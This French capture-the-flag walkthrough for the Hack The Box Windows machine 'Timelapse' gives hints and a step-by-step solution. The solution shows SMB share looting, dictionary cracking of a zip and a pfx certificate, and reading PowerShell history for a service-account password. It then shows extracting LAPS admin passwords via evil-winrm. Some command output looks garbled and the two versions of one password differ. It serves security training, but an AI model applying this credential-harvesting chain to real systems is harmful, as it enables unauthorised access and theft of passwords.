---
title: Hack The Box - Timelapse
meta_title: ""
description: La box Timelapse est une box Windows proposée par Hack The Box. Elle permet de travailler de façon réaliste l'infiltration dans un environnement Windows.
date: 2024-05-28T04:00:00Z
image: /images/Timelapse.png
categories:
  - Réaliste
  - Facile
author: Emma.exe
tags:
  - realiste
  - SMB
  - LAPS
  - brute-force
draft: false
---

## Introduction

Pour la résolution de ce challenge je vous propose deux niveaux d'aide : 
- Le premier niveau sous la forme d'indices et de ressources à explorer pour résoudre le challenge, sans pour autant donner la solution
- Le deuxième niveau qui présente un exemple de résolution.

{{< notice "tip" >}} Essayez de ne pas regarder la solution si vous voulez vraiment progresser. Une fois le challenge résolu, il peut être intéressant de la regarder pour apprendre de nouvelles techniques ! {{< /notice >}}

## Enumération

{{< tabs >}} {{< tab "Niveau 1" >}}
On commence toujours par énumérer la machine avec nmap.
Veillez à bien énumérer tous les ports de la machine pour être sûrs de ne rien manquer.
En effet, il est courant que les créateurs des box modifient les ports par défaut.
Ainsi, on peut très bien trouver un site web sur le port 8080 par exemple.

Une fois que vous possédez une meilleure connaissance de votre machine, des services qui tournent etc, vous pouvez partir à la recherche de vulnérabilités.

Il est important d'énumérer la machine **entièrement** avant de passer à la phase d'exploitation pour éviter de perdre trop de temps.

Si vous ne trouvez pas de vulnérabilités, c'est certainement que vous n'avez pas assez énumérer.

Avez-vous énumérer de façon spécifique les services intéressants ?

{{< /tab >}}

{{< tab "Niveau 2" >}}

On commence toujours une énumération par nmap.
Ici, vu qu'il s'agit d'une machine Windows qui ne répond pas au ping par défaut, on utilise l'option `-Pn` pour éviter de faire le test de ping : 
```sh
nmap -Pn 10.10.11.152
```

Résultats :
```sh
nmap -Pn 10.10.11.152

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 09:26 EDT
Nmap scan report for 10.10.11.152
Host is up (0.012s latency).
Not shown: 990 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap 
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
639/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
```

On peut aussi utiliser l'option `-sV` pour en apprendre davantage sur les versions des services ouverts sur la machine :

```sh
nmap -sV -Pn 10.10.11.152
```

Ici, nous pouvons voir plusieurs ports, tous liés à l'environnement Windows tel que kerberos et smb.
{{< /tab >}}
{{< /tabs >}}

## Initial access

{{< tabs >}} {{< tab "Niveau 1" >}}

- Quel service pourrait contenir des informations intéressantes publics ?
- Existe-t-il un outil déjà existant sur la kali pour l'énumérer ? N'hésitez pas à consulter son man afin de l'utiliser correctement.
- Tentez de différencier les informations par défaut et celles qui ont été créer par un humain.

{{< /tab >}}{{< tab "Niveau 2" >}}
SMB est le protocole de partage réseau de Windows. Il permet ainsi de partager des dossiers et des fichiers. S'il a été configuré avec des permissions trop larges, n'importe qui pourrait récupérer des fichiers sensibles.

Sur Kali, on utilise l'outil smbclient qui permet de lister les partages de la machine.
On utilise l'option `-L` pour lister les partages et `-N` pour se connecter sans mot de passe :

```sh
smbclient -L 10.10.11.152 -N

        Sharename    Type     Comment
        _________    ____     _______
        ADMIN$       Disk     Remote Admin
        C$           Disk     Default Share
        IPC$         IPC      Remote IPC
        NETLOGON     Disk     Logon server share
        Shares       Disk      
        SYSVOL       Disk     Logon server share
SMB1 disabled -- no workgroup available
```

On voit qu'on peut lister les partages.
Les partages suivants sont des partages par défaut, sur lesquels il est rare d'avoir les droits :
- ADMIN$
- C$
- IPC
- NETLOGON
- SYSVOL

Ainsi, le partage Shares est le plus intéressant, car il est a été créer par un humain.
{{< /tab >}}
{{< /tabs >}}

## Exploitation

{{< tabs >}} {{< tab "Niveau 1" >}}

- Quel fichier pourrait contenir des informations sensibles, qui pourraient mener à une exploitation ?
- Comment extraire les informations de ce fichier ? Existe-t-il un outil déjà disponible sur Kali qui permettrait de "lire" ce fichier ?
- Tentez de comprendre à quoi correspondent les extensions des fichiers que vous obtenez et qu'est-ce que vous pouvez en faire.

{{< notice "info" >}} Pour les attaques par brute-force, il est largement d'utiliser le dictionnaire rockyou, qui comprend tous les mots de passe les plus utilisés. {{< /notice >}}

{{< /tab >}}{{< tab "Niveau 2" >}}

Pour lister le contenu du dossier Shares et obtenir un shell interactif permettant de télécharger les fichiers, on utilise la commande suivante : 
```sh
smbclient -U user1 //10.10.11.152/Shares
Enter WORKGROUP\user1's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                    D        0  Mon Oct 25 17:39:15 2021
  ..                                   D        0  Mon Oct 25 17:39:15 2021
  Dev                                  D        0  Mon Oct 25 21:40:06 2021
  Helpdesk                             D        0  Mon Oct 25 17:48:42 2021
```

L'option `-U` permet de spécifier un utilisateur. Ici on peut mettre n'importe quel utilisateur.

On parcourt les dossiers et on trouve des fichiers LAPS dans HelpDesk et une archive protégée par mdp dans Dev.

On récupère le fichier zip avec la commande mget :
```sh
smb: \Dev\> mget winrm_backup.zip
```

Etant donné, que le zip est protégé par un mot de passe, on peut tenter de le brute force avec fcrackzip :
```sh
sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip

PASSWORD FOUND!!!!: pw == supremelegacy
```

On peut maintenant décompresser de l’archive avec unzip.
A l'intérieur on y trouve une clé privée au format pfx protégé par un mot de passe.

Pour cela on peut utiliser l'outil crackpkcs12 : https://github.com/crackpkcs12/crackpkcs12

On utilise le dictionnaire rockyou. Il s'agit d'un dictionnaire contenant les mots de passe les plus courants, très utilisé dans les CTF.

Crack du mot de passe du fichier pfx :
```sh
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx

Dictionary attack - starting 5 threads

*********************************************************
Dictionary attack - Thread 2 - Password found: thuglegacy
*********************************************************
```

On peut maintenant extraire le certificat du fichier pfx, qui peut servir pour se connecter : 
```sh
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt
```

### Connexion avec WinRM

Maintenant que nous avons récupérer toutes ces informations, nous pouvons nous connecter avec evil-winrm.
Pour cela, nous avons besoin d'un nom d'utilisateur, du mot de passe, du certificat et de la clé privé :
```sh
evil-winrm -i 10.10.11.152 -S -u Legacyy -p thuglegacy -c certificate.crt -k cert.pem
```
On obtient un shell interactif.
On énumère les dossiers pour trouver le flag utilisateur. On peut utiliser la commande `dir -R` pour les afficher de façon récursive.

```sh
dir -R

  Directory C:\Users\legacyy

Mode            LastWriteTime      Length Name
____             ____________      ______ ____
d-r---     4/16/2022  4:40 PM             Desktop
d-r---    10/25/2021  8:22 AM             Documents
d-r---    9/15/2018   12:19 AM            Downloads
d-r---    9/15/2018   12:19 AM            Favorites
d-r---    9/15/2018   12:19 AM            Links
d-r---    9/15/2018   12:19 AM            Music
d-r---    9/15/2018   12:19 AM            Pictures
d-----    9/15/2018   12:19 AM            Saved Games
d-r---    9/15/2018   12:19 AM            Videos

  Directory: C:\Users\legacyy\Desktop
Mode            LastWriteTime      Length Name
____             ____________      ______ ____
-a         4/16/2022  4:40 PM          40 passwords
-ar        4/16/2022 12:23 AM          34 user.txt
-a         4/16/2022 10:26 AM     1935872 winPEASx64.exe
```

{{< /tab >}}
{{< /tabs >}}

## Elévation de privilèges

{{< tabs >}} {{< tab "Niveau 1" >}}

- Enumérer les informations générales de la machine afin d'avoir un maximum de contexte sur l'environnement.
- Enumérer les informations relatives à l'utilisateur (variables d'environnement, autorisations, historique, fichiers et dossiers créer par l'utilisateur, process...).
- Utiliser un script afin d'énumérer automatiquement toutes ces informations tel que WinPEAS.
- Renseignez-vous sur les processus que vous ne connaissez pas afin de ne pas louper des informations importantes.

{{< /tab >}}{{< tab "Niveau 2" >}}

Nous devons maintenant nous élever en privilèges afin d'obtenir le flag root.

Ici, nous devons rechercher dans l’historique des commandes de legacyy :
```powershell
cat C:\Users\Legacyy\Appdata\Roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
Enter PEM pass phrase:
whoami
ipconfig /all
netstat ano select-string LIST
$so New-PSSessionOption -SkipCACheck -SkinCNCheck -SkipRevocationCheck
Sp ConvertTo-SecureString E3RSQ62*12p7PLICSKWaxuay -AsPlainText -Force Sc New-Object System.Management.Automation.PsCredential ('svc_deploy', $p) invoke-command-computername Localhost credential Sc-port 5986 -usessi
SessionOption Sso scriptblock (whoami)
get-aduser-filter-properties
exit
```
Nous voyons qu'un mot de passe a été utilisé pour svc_deploy : **E3R$Q62^12p7PLlC%KWaxuaV**.

On se connecte avec le utilisateur svc_deploy (toujours avec Evil-WinRM):
```sh
evil-winrm -i 10.10.11.152 -S -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV
```
De nouveau, en faisant `dir -R`, on se rend compte que LAPS est configuré. 
LAPS est un utilitaire Windows permettant de modifier de façon cyclique le mot de passe Administrateur local. Seuls les utilisateurs autorisés peuvent visualiser ce mot de passe.
Ce mot de passe est stocké dans les attributs Windows de l'ordinateur.

Par chance, svc_deploy peut lire les attributs concernant LAPS.
On regarde une documentation de LAPS afin de connaitre les attributs concernés : https://www.it-connect.fr/chapitres/comment-afficher-les-mots-de-passe-laps/
Avec la commande suivante, on les affiche :
```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
```
### Obtention du flag root
On se connecte de nouveau avec evil-winrm avec le mot de passe obtenu et on récupère le flag root.

Si on ne sait pas où est le flag root.txt :
```powershell
get-childitem root.txt -path C:\ -recurse
```
{{< /tab >}}
{{< /tabs >}}
